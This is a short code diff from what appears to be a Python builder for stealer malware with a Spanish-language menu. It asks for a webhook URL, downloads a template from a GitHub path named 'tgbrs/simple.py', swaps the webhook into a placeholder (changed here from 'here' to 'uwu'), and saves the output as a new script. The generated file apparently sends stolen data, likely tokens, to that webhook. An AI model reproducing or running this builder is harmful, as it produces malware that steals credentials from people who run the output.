@@ -116,7 +116,7 @@ def Simple():
         webhook = input(f"\n {MK4}[{MK5}*{MK4}]{Colors.white} Ingresa la Webhook {Colors.red}> {Colors.white}")
         if not check_webhook(webhook):
             filename = input(f" {MK4}[{MK5}*{MK4}]{Colors.white} Nombre del Archivo {Colors.red}> {Colors.white}")
-        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/simple.py").text.replace("here", webhook)
+        code = get("https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/simple.py").text.replace("uwu", webhook)
 
         with open(f"{filename}.py", 'w', errors="ignore") as f:
             f.write(code)
